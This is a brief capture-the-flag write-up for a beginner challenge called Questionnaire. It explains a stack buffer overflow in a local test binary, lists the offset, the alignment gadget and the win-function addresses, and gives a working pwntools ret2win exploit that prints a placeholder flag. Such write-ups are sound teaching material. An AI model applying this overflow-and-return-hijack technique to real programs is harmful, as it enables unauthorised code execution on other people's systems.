# Questionnaire - Very Easy Pwn

## Vulnerability
Stack buffer overflow in `vuln()` — buffer is 0x20 bytes but `fgets()` reads up to 0x100 bytes.

## Key Details
- **Arch**: amd64, No PIE, No canary, NX enabled
- **Win function**: `gg()` at `0x401176` calls `system("cat flag.txt")`
- **Offset**: 0x20 (buffer) + 0x8 (saved rbp) = 0x28 bytes to return address
- **Stack alignment**: Extra `ret` gadget (`0x40101a`) needed before `gg()` to align RSP to 16 bytes for `system()` (movaps issue)

## Exploit
```python
from pwn import *

payload = b'A' * 0x28 + p64(0x40101a) + p64(0x401176)
#                padding        ret gadget      gg()
p = process('./test')
p.sendline(payload)
print(p.recvall().decode())
```

## Flag
```
FAKE_FLAG{questionnaire_solved}
```
